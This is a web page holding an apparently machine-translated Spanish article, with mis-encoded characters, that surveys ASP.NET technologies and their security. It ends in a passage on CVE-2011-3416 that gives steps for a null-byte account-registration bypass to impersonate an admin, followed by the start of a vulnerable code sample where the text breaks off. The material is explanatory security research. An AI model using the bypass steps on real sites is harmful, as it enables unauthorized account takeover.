<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëä üÉè üï¥üèø ¬øEs posible hackear la infraestructura ASP? üßúüèæ üí≤ üôèüèø</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Como dicen los expertos en seguridad de la informaci√≥n: "Rompen todo, a todos y siempre". Al mismo tiempo, los ataques a ASP.NET son algo raro. Por lo...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>¬øEs posible hackear la infraestructura ASP?</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/rambler-co/blog/413649/"><img src="https://habrastorage.org/webt/lw/h4/e6/lwh4e6eo0ogtcv4ycwp2oy_6pa0.jpeg"><br><br>  Como dicen los expertos en seguridad de la informaci√≥n: "Rompen todo, a todos y siempre".  Al mismo tiempo, los ataques a ASP.NET son algo raro.  Por lo tanto, siempre es extremadamente curioso aprender algo nuevo sobre esto.  Bajo el corte, la historia de Aleksey Morozov, especialista en el departamento de seguridad de la informaci√≥n del Grupo Rambler, sobre las fortalezas y debilidades de esta tecnolog√≠a. <a name="habracut"></a><br><br><h3>  <font color="#0000cc">Introduccion</font> </h3><br>  Hoy ASP se ha ganado su popularidad como herramienta para crear proyectos medianos y grandes.  Y, como cualquier soluci√≥n popular, ASP.NET tambi√©n es de inter√©s para investigadores de seguridad externos, piratas inform√°ticos y probadores. <br><br>  Este art√≠culo analiza los posibles problemas de seguridad de ASP.NET en varias versiones.  Sin embargo, debe tenerse en cuenta que ASP es muy inferior en el n√∫mero de soluciones para el mismo PHP, y esto se debe a muchos factores. <br><br>  A diferencia de PHP, usar ASP suele ser mucho m√°s complicado y costoso (usando la versi√≥n comercial de IIS, el entorno de desarrollo de Visual Studio).  Hasta hace poco (el advenimiento de ASP.NET Core), el uso solo era posible en Windows y en el servidor web IIS.  La implementaci√≥n tambi√©n es m√°s complicada. <br><br>  <b><b>ASP</b></b> ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Active Server Pages</a> ) es la tecnolog√≠a de Microsoft para crear p√°ginas din√°micas. <br><br>  <b>Descripci√≥n:</b> esta tecnolog√≠a permite crear p√°ginas HTML con inserciones en el lenguaje Jscript (muy similar a JavaScript, pero adem√°s de las secuencias de comandos del cliente, tiene varias opciones para trabajar con el sistema operativo Windows y las inserciones del servidor en ASP) <br><br>  <u><b>Un ejemplo</b></u> : <br><br><pre><code class="hljs pgsql">&lt;% @ <span class="hljs-keyword"><span class="hljs-keyword">Language</span></span> = "JScript" %&gt;&lt;% Response.<span class="hljs-keyword"><span class="hljs-keyword">Write</span></span>("Hello World!"); %&gt;</code> </pre> <br>  <b>ASP.NET</b> <br><br>  La siguiente ronda de desarrollo tecnol√≥gico fue la creaci√≥n del n√∫cleo ASP basado en el marco .Net.  Como resultado, ASP recibi√≥ todas las caracter√≠sticas de esta soluci√≥n, a saber: <br><br><ul><li>  uso de diferentes lenguajes de programaci√≥n (C #, Visual Basic.NET, J # y JScript .NET); </li><li>  mayor velocidad en comparaci√≥n con las tecnolog√≠as de secuencias de comandos, ya que la primera vez que el c√≥digo se compila y se coloca en un cach√© especial, y posteriormente solo se ejecuta, sin requerir un an√°lisis, optimizaci√≥n que requiere mucho tiempo; </li><li>  c√≥digo compilado que le permite detectar mejor los errores, por lo que el proceso de depuraci√≥n se vuelve m√°s eficiente; </li><li>  la capacidad de almacenar en cach√© la p√°gina; </li><li>  separaci√≥n de la presentaci√≥n de la l√≥gica empresarial. </li></ul><br>  Basado en la soluci√≥n ASP.NET, se han creado las siguientes tecnolog√≠as, que consideraremos. <br><br>  <b>ASP.NET Ajax</b> es una de las extensiones de ASP.NET que le permite usar Ajax para actualizar asincr√≥nicamente parte del contenido. <br><br>  <b><u>Un ejemplo</u></b> : <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Refresh"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:UpdatePanel</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"UpdatePanel1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Triggers</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:AsyncPostBackTrigger</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">ControlID</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">EventName</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Click"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">Triggers</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentTemplate</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%=</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">DateTime.Now</span></span></span><span class="hljs-tag"> %&gt;</span></span><span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">span</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">ContentTemplate</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:UpdatePanel</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <b>ASP.NET Web Forms</b> : una nueva evoluci√≥n de la tecnolog√≠a ASP, en la que hay una transici√≥n a un modelo orientado a componentes para crear aplicaciones. <br><br>  <b>Descripci√≥n:</b> <br><br>  El modelo de formularios web se basa en tres conceptos b√°sicos: devoluci√≥n de p√°gina, estado de la vista y controles del servidor.  Cada solicitud HTTP enviada al servidor web y asignada al tiempo de ejecuci√≥n ASP.NET pasa por varias etapas en las que el procesamiento del evento de devoluci√≥n de datos ocupa un lugar central.  El evento de devoluci√≥n de datos es la acci√≥n principal que el usuario espera recibir como resultado del procesamiento de su solicitud.  (por ejemplo, haga clic en un bot√≥n). <br><br>  En pocas palabras, hay controles tradicionales (controles) y un modelo de desarrollo basado en eventos. <br><br>  <b><u>Un ejemplo</u></b> : <br><br>  La vista (archivo aspx) es del lado del cliente. <br><br><pre> <code class="hljs xml"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">%@</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Page</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Language</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"C#"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">CodeFile</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SamplePage.aspx.cs"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Inherits</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"SamplePage"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">AutoEventWireup</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"true"</span></span></span><span class="hljs-tag"> %&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>Code-Behind Page Model<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"form1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Label</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Label1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Label"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Label</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">br</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">runat</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"server"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">onclick</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button1_Click"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Text</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"Button"</span></span></span><span class="hljs-tag"> &gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">asp:Button</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">form</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Procesamiento l√≥gico (archivo cs (si usa C #)) - lado del servidor. <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI.WebControls; <span class="hljs-built_in"><span class="hljs-built_in">public</span></span> partial <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> SamplePage : <span class="hljs-keyword"><span class="hljs-keyword">System</span></span>.Web.UI.Page { protected <span class="hljs-type"><span class="hljs-type">void</span></span> Button1_Click(<span class="hljs-keyword"><span class="hljs-keyword">object</span></span> sender, EventArgs e) { Label1.Text = "Clicked at " + DateTime.Now.ToString(); } }</code> </pre><br>  <b>ASP.NET Web API</b> es otra extensi√≥n que le permite crear servicios API para un desarrollo e interacci√≥n m√°s convenientes con la aplicaci√≥n. <br><br>  <b><u>Un ejemplo</u></b> : <br><br><pre> <code class="hljs cs">[<span class="hljs-meta"><span class="hljs-meta">HttpDelete(</span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"{id}"</span></span></span><span class="hljs-meta">)</span></span>] <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> IActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Delete</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-params"><span class="hljs-keyword">long</span></span></span></span><span class="hljs-function"><span class="hljs-params"> id</span></span></span><span class="hljs-function">)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> todo = _context.TodoItems.Find(id); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (todo == <span class="hljs-literal"><span class="hljs-literal">null</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> NotFound(); } _context.TodoItems.Remove(todo); _context.SaveChanges(); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> NoContent(); }</code> </pre><br>  <b>ASP.NET MVC</b> : la siguiente etapa en el desarrollo de la tecnolog√≠a ocurre despu√©s de la separaci√≥n de la l√≥gica empresarial en tres componentes del patr√≥n MVC (Modelo-Vista-Controlador).  El motor de la maquinilla de afeitar tambi√©n se est√° introduciendo y es posible personalizar de forma independiente los elementos administrados del sitio, lo cual fue muy dif√≠cil con los formularios web. <br><br>  <b>Ventajas</b> : <br><br><ul><li>  la gesti√≥n de estructuras complejas se facilita dividiendo la aplicaci√≥n en un modelo, presentaci√≥n y controlador; </li><li>  no se utilizan los formularios de vista de estado y servidor.  Esto hace que la plataforma MVC sea ideal para desarrolladores que necesitan un control completo sobre el comportamiento de la aplicaci√≥n; </li><li>  El circuito del controlador principal en el que las solicitudes de aplicaciones web se procesan a trav√©s de un solo controlador.  Esto le permite crear aplicaciones que admitan una infraestructura de enrutamiento extendida; </li><li>  Muy adecuado para aplicaciones web compatibles con grandes equipos de desarrollo. </li></ul><br>  <b><u>Un ejemplo</u></b> : <br><br>  <b>Vista</b> <br><br><pre> <code class="hljs xml">@{ Layout = null; } <span class="hljs-meta"><span class="hljs-meta">&lt;!DOCTYPE html&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">meta</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"viewport"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">content</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"width=device-width"</span></span></span><span class="hljs-tag"> /&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span>SomeView<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">title</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">head</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span>@ViewBag.Message<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">h2</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">div</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">body</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">html</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  <b>Modelo</b> <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel; <span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.ComponentModel.DataAnnotations; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">MvcModels.Models</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">partial</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">User</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> UserId { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">""</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> FirstName { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">""</span></span>)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">string</span></span> LastName { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } [DisplayName(<span class="hljs-string"><span class="hljs-string">" "</span></span>)] [DataType(DataType.Date)] <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> DateTime BirthDate { <span class="hljs-keyword"><span class="hljs-keyword">get</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">set</span></span>; } } }</code> </pre><br>  <b>Controlador</b> <br><br><pre> <code class="hljs cs"><span class="hljs-keyword"><span class="hljs-keyword">using</span></span> System.Web.Mvc; <span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">NonCompiledMvc.Controllers</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">HomeController</span></span> : <span class="hljs-title"><span class="hljs-title">Controller</span></span> { <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> ActionResult </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Index</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> View((<span class="hljs-keyword"><span class="hljs-keyword">object</span></span>)<span class="hljs-string"><span class="hljs-string">"It Works!"</span></span>); } } }</code> </pre><br>  <b>ASP.NET Core</b> : el pr√≥ximo avance en ASP.NET se est√° convirtiendo en multiplataforma, con soporte para C # 7.0. <br><table><tbody><tr><th>  Tecnolog√≠a </th><th>  Fortalezas </th><th>  Debilidades </th></tr><tr><td>  P√°ginas Active Server, ASP </td><td>  Objetivo com√∫n </td><td>  Interpretado en tiempo de ejecuci√≥n, admite "c√≥digo de espagueti" </td></tr><tr><td>  ASP.NET Web Forms 1.0 / 1.1 </td><td>  Compilado, UI, soporta OOP </td><td>  Alto rendimiento, HTML complejo, no comprobable </td></tr><tr><td>  ASP.NET Web Forms 2.0 </td><td>  - </td><td>  - </td></tr><tr><td>  ASP.NET Ajax </td><td>  Implementaci√≥n de Ajax </td><td>  Complejidad irrazonable, falta de flexibilidad </td></tr><tr><td>  ASP.NET Web Forms 3.5-4.0 </td><td>  - </td><td>  - </td></tr><tr><td>  ASP.NET MVC 1.0-5.0 </td><td>  El modelo de desarrollo est√° cambiando por completo.  Hay flexibilidad </td><td>  La falta de plataforma cruzada.  Incapaz de compilar sobre la marcha </td></tr><tr><td>  ASP.NET Core </td><td>  Aparece la plataforma cruzada.  C√≥digo abierto </td><td>  - </td></tr></tbody></table><br><h3>  <font color="#0000cc">Autenticaci√≥n en ASP.NET</font> </h3><br>  Hay tres tipos de autenticaci√≥n en ASP.NET MVC que son significativamente diferentes entre s√≠. <br><br><ul><li>  <b>Sin autenticaci√≥n:</b> identidad ASP.NET y sin sistema de autenticaci√≥n incorporado; </li><li>  <b>Cuentas de usuario individuales: el</b> proyecto incluye de manera predeterminada el sistema de identidad ASP.NET, que le permite autorizar a los usuarios tanto dentro de la aplicaci√≥n como a trav√©s de servicios externos como google, twitter, etc. </li><li>  <b>Cuentas organizacionales:</b> adecuadas para sitios y aplicaciones web de empresas y organizaciones individuales; </li><li>  <b>Autenticaci√≥n de Windows:</b> un sistema de autenticaci√≥n para redes de intranet que utilizan cuentas de Windows. </li></ul><br><img src="https://habrastorage.org/webt/wr/rz/o4/wrrzo4fj86bsayurdvfxzcmdvze.png"><br><br><h3>  <font color="#0000cc">ASP.NET en t√©rminos de pirater√≠a</font> </h3><br>  Como cualquier tecnolog√≠a, ASP.NET ha sido hackeado.  A continuaci√≥n, describiremos los estudios de seguridad m√°s populares, incluidos no solo en ASP, sino tambi√©n en conjunto con la infraestructura. <br><br>  <b>Estad√≠sticas CVE</b> <br><br><img src="https://habrastorage.org/webt/af/at/ft/afatftxyrlf1kds_37latbgi3fc.png"><br><br>  Como se puede ver en la tabla, las estad√≠sticas sobre hallazgos son muy pocas.  Esto se debe a que ASP.NET requiere un buen conocimiento para examinarlo en detalle.  Y tambi√©n los recursos en √©l son mucho menores que en el mismo PHP. <br><br>  <b>Uso de un byte nulo para omisi√≥n de autorizaci√≥n</b> <br><br>  <b>CVE:</b> CVE-2011-3416 <br>  <b>Descripci√≥n:</b> es posible omitir la autorizaci√≥n. <br><br>  <b>Algoritmo</b> <br><br><ol><li>  Registre una nueva cuenta con un nombre de usuario existente; </li><li>  Al registrarse, agregue caracteres de byte nulo y adicionales (admin% 0012sd); </li><li>  Por lo tanto, se pasar√° la verificaci√≥n de unicidad.  Se crear√° un nuevo usuario "admin" con el mismo rol, pero con una nueva contrase√±a. </li></ol><br>  <u><b>Ejemplo de c√≥digo vulnerable</b></u> : <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (IsPostBack) { String <span class="hljs-type"><span class="hljs-type">name</span></span> = Request.Form[‚Äú<span class="hljs-type"><span class="hljs-type">name</span></span>‚Äù]; String <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> = Request.Form[‚Äú<span class="hljs-keyword"><span class="hljs-keyword">password</span></span>‚Äù]; <span class="hljs-keyword"><span class="hljs-keyword">If</span></span> (<span class="hljs-type"><span class="hljs-type">name</span></span> != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> &amp;&amp; <span class="hljs-keyword"><span class="hljs-keyword">password</span></span> != <span class="hljs-keyword"><span class="hljs-keyword">null</span></span> &amp;&amp; 